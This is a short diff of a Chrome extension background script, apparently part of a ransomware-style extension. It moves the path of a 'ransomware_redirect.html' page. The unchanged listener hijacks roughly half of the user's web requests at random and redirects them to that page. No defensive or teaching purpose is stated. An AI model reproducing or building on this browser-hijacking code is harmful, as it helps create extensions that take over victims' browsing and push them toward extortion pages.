@@ -13,7 +13,7 @@ chrome.browserAction.onClicked.addListener(function(tab) {
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
         if (Math.random() > 0.5) {
-            return {redirectUrl: chrome.runtime.getURL("ransomware_redirect.html")};
+            return {redirectUrl: chrome.runtime.getURL("./components/ransomware/ransomware_redirect.html")};
         }//put here the url you want to redirect the page to
     },
     {
